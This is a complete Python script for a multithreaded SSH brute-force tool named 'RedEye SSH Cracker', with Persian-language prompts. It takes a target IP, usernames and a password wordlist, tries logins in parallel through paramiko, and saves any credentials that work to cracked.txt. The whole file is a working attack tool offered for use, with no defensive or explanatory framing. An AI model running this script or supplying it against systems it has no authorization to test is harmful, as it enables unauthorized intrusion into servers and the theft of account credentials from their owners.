import sys
import threading
import queue
import time
import socket
import signal
import warnings

# بررسی نصب بودن پیش‌نیازها
try:
    import paramiko
    from colorama import Fore, Style, init
    from tqdm import tqdm
except ImportError as e:
    print(f"[-] خطا: پیش‌نیازهای لازم نصب نیستند. لطفاً دستور زیر را در Pydroid اجرا کنید:\npip install paramiko colorama tqdm")
    sys.exit(1)

init(autoreset=True)
warnings.filterwarnings("ignore")

class RedEyeTheme:
    BANNER = (
        Fore.RED + Style.BRIGHT +
        "    ██████╗ ███████╗██████╗ ███████╗██╗   ██╗███████╗\n"
        "    ██╔══██╗██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝\n"
        "    ██████╔╝█████╗  ██║  ██║█████╗   ╚████╔╝ █████╗  \n"
        "    ██╔══██╗██╔══╝  ██║  ██║██╔══╝    ╚██╔╝  ██╔══╝  \n"
        "    ██║  ██║███████╗██████╔╝███████╗   ██║   ███████╗\n"
        "    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝   ╚═╝   ╚══════╝\n"
        "          v3.0 \n" +
        Style.RESET_ALL
    )
    SUCCESS = Fore.GREEN + Style.BRIGHT
    INFO = Fore.CYAN
    WARNING = Fore.YELLOW + Style.BRIGHT
    ERROR = Fore.RED + Style.BRIGHT
    RESET = Style.RESET_ALL

class RedEyeSSHCracker:
    def __init__(self):
        self.q = queue.Queue()
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.found = False

    def signal_handler(self, signum, frame):
        print(f"\n{RedEyeTheme.WARNING}[!] خروج در حال انجام...{RedEyeTheme.RESET}")
        self.stop_event.set()
        sys.exit(0)

    def pre_flight_check(self, host, port):
        try:
            sock = socket.create_connection((host, int(port)), timeout=3)
            sock.close()
            return True
        except:
            return False

    def test_credential(self, host, port, username, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port=int(port), username=username, password=password, timeout=5, allow_agent=False, look_for_keys=False)
            client.close()
            return True
        except:
            return False

    def worker(self, host, port, pbar):
        while not self.q.empty() and not self.stop_event.is_set():
            username, password = self.q.get()
            if self.test_credential(host, port, username, password):
                with self.lock:
                    if not self.found:
                        self.found = True
                        print(f"\n{RedEyeTheme.SUCCESS}[+] SUCCESS! {username}:{password}{RedEyeTheme.RESET}")
                        with open("cracked.txt", "a") as f:
                            f.write(f"{host} | {username}:{password}\n")
                        self.stop_event.set()
            pbar.update(1)
            self.q.task_done()

    def run(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        print(RedEyeTheme.BANNER)

        host = input(f"{Fore.RED + Style.BRIGHT}Target IP: {Style.RESET_ALL}").strip()
        port = input(f"{Fore.RED + Style.BRIGHT}Port [22]: {Style.RESET_ALL}").strip() or "22"
        
        print(f"\n{Fore.RED + Style.BRIGHT}1. Single User\n2. Userlist File{Style.RESET_ALL}")
        choice = input(f"{Fore.RED + Style.BRIGHT}Select: {Style.RESET_ALL}").strip()
        
        usernames = []
        if choice == "2":
            u_path = input(f"{Fore.RED + Style.BRIGHT}Userlist Path: {Style.RESET_ALL}").strip()
            with open(u_path, "r", encoding="latin-1") as f:
                usernames = [line.strip() for line in f if line.strip()]
        else:
            usernames = [input(f"{Fore.RED + Style.BRIGHT}Username: {Style.RESET_ALL}").strip()]

        w_path = input(f"{Fore.RED + Style.BRIGHT}Wordlist Path: {Style.RESET_ALL}").strip()
        try:
            with open(w_path, "r", encoding="latin-1") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{RedEyeTheme.ERROR}[!] Wordlist file not found!{RedEyeTheme.RESET}")
            return

        threads_count = int(input(f"{Fore.RED + Style.BRIGHT}Threads [15]: {Style.RESET_ALL}").strip() or "15")

        if not self.pre_flight_check(host, port):
            print(f"{RedEyeTheme.ERROR}[!] Target Unreachable!{RedEyeTheme.RESET}")
            return

        for user in usernames:
            for pwd in passwords:
                self.q.put((user, pwd))

        pbar = tqdm(total=self.q.qsize(), desc="[RedEye]", unit="req")
        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=self.worker, args=(host, port, pbar))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()
        
        pbar.close()

if __name__ == "__main__":
    RedEyeSSHCracker().run()
      
